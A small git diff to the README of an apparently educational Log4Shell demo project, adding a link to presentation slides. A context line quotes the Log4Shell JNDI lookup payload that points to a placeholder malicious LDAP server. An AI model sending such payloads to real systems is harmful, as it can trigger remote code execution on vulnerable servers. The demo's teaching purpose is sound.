@@ -61,3 +61,7 @@ where `${jndi:ldap://IP_OR_DOMAIN_MALICIOUS_SERVER:1389/a}` is just URL encoded
 ```
 ../make.sh logs 
 ```
+
+## Slides
+
+https://raw.githubusercontent.com/mschmnet/Log4Shell-demo/main/pdf/slides.pdf
